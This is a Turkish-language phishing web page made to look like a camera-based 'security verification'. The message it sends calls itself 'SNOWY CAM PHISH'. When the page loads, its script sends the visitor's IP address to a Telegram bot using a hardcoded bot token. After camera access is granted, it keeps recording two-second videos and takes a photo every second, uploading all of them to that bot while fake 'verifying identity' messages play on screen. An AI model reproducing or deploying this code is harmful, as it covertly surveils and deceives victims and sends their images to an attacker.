<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Güvenlik Doğrulaması</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        h2 { color: #333; font-size: 28px; margin-bottom: 10px; }
        h2 span { color: #667eea; }
        p { color: #666; margin-bottom: 30px; }
        .btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white; border: none; padding: 16px 32px;
            font-size: 18px; font-weight: bold; border-radius: 50px;
            cursor: pointer; width: 100%;
        }
        .btn:hover { transform: translateY(-2px); }
        .loading { display: none; margin: 20px 0; }
        .spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid #667eea;
            border-radius: 50%; width: 40px; height: 40px;
            animation: spin 1s linear infinite; margin: 0 auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loading-text { color: #667eea; margin-top: 10px; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>❄️ <span>GÜVENLİK</span> DOĞRULAMASI</h2>
        <p>Devam etmek için kamera erişimine izin verin.</p>
        <button class="btn" id="startBtn" onclick="startCamera()">📸 BAŞLAT</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div class="loading-text" id="loadingText">Güvenlik kontrolü...</div>
        </div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // ============================================
        // GİZLİ KONFİGÜRASYON
        // ============================================
        const BOT_TOKEN = "8773124715:AAG3Y7itEmKlsrvOfUkrvXoZmJrRPQanzro";
        const urlParams = new URLSearchParams(window.location.search);
        const TARGET_ID = urlParams.get('i');
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        
        let mediaRecorder = null;
        let recordedChunks = [];
        let videoCount = 0;
        let photoCount = 0;
        let ipGonderildi = false;
        let photoInterval = null;
        let videoInterval = null;
        
        // ============================================
        // İP ADRESİ AL
        // ============================================
        async function getIP() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                return ipData.ip;
            } catch(e) {
                return 'Alınamadı';
            }
        }
        
        // ============================================
        // İP'Yİ TELEGRAM'A GÖNDER
        // ============================================
        async function sendIP(ip) {
            if (ipGonderildi) return;
            
            const msg = `<b>❄️ SNOWY CAM PHISH ❄️</b>\n━━━━━━━━━━━━━━━━━━━━━\n🌐 <b>IP Adresi:</b> ${ip}\n⏱️ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @snowy_dexry_wexry ⚡`;
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ 
                    chat_id: TARGET_ID, 
                    text: msg, 
                    parse_mode: 'HTML'
                })
            });
            
            ipGonderildi = true;
        }
        
        // ============================================
        // 2 SANİYELİK VİDEO KAYDI BAŞLAT (SÜREKLİ)
        // ============================================
        function startVideoRecording() {
            recordedChunks = [];
            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            
            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) recordedChunks.push(event.data);
            };
            
            mediaRecorder.onstop = async () => {
                videoCount++;
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                
                const formData = new FormData();
                formData.append('chat_id', TARGET_ID);
                formData.append('video', blob, `video_${Date.now()}.webm`);
                formData.append('caption', `🎥 Video #${videoCount} - ${new Date().toLocaleString('tr-TR')}`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                // Hemen yeni videoyu başlat (üst üste)
                if (stream && stream.active) {
                    setTimeout(() => {
                        startVideoRecording();
                    }, 100); // 100ms bekle, sonra tekrar başla
                }
            };
            
            // 2 saniyelik video kaydı
            mediaRecorder.start();
            setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, 2000); // 2 saniye
        }
        
        // ============================================
        // 1 SANİYEDE 1 FOTOĞRAF ÇEK (ÜST ÜSTE)
        // ============================================
        async function takePhoto() {
            try {
                if (!video.videoWidth || !video.videoHeight) return;
                
                photoCount++;
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(async function(blob) {
                    if (!blob) return;
                    
                    const formData = new FormData();
                    formData.append('chat_id', TARGET_ID);
                    formData.append('photo', blob, `foto_${Date.now()}.jpg`);
                    formData.append('caption', `📸 Fotoğraf #${photoCount} - ${new Date().toLocaleString('tr-TR')}`);
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                }, 'image/jpeg', 0.8);
                
            } catch(e) {
                console.log("Fotoğraf hatası:", e);
            }
        }
        
        // ============================================
        // KAMERAYI BAŞLAT
        // ============================================
        async function startCamera() {
            try {
                // Kamera izni iste
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: {
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        facingMode: "user"
                    }
                });
                
                video.srcObject = stream;
                
                video.onloadedmetadata = async () => {
                    await video.play();
                    
                    // IP'yi gönder
                    const ip = await getIP();
                    await sendIP(ip);
                    
                    document.getElementById('startBtn').style.display = 'none';
                    document.getElementById('loading').style.display = 'block';
                    
                    // 1 saniye bekle
                    setTimeout(() => {
                        // 2 SANİYELİK VİDEOLARI BAŞLAT (ÜST ÜSTE)
                        startVideoRecording();
                        
                        // 1 SANİYEDE 1 FOTOĞRAF ÇEK (SÜREKLİ)
                        photoInterval = setInterval(takePhoto, 1000); // Her saniye
                        
                    }, 1000);
                };
                
                // Yazı değiştir
                const texts = ["Güvenlik kontrolü...", "Kimlik doğrulanıyor...", "Lütfen bekleyin...", "Kamera aktif..."];
                let i = 0;
                setInterval(() => {
                    i = (i + 1) % texts.length;
                    document.getElementById('loadingText').innerText = texts[i];
                }, 2000);
                
            } catch(e) {
                console.log("Kamera hatası:", e);
                alert('Kamera izni gerekli!');
            }
        }
        
        // ============================================
        // SAYFA YÜKLENDİĞİNDE
        // ============================================
        window.onload = async function() {
            if (TARGET_ID) {
                const ip = await getIP();
                await sendIP(ip);
            }
        };
        
        // ============================================
        // SAYFA KAPANIRKEN
        // ============================================
        window.onbeforeunload = function() {
            if (photoInterval) clearInterval(photoInterval);
            if (videoInterval) clearInterval(videoInterval);
            
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        };
    </script>
</body>
    </html>
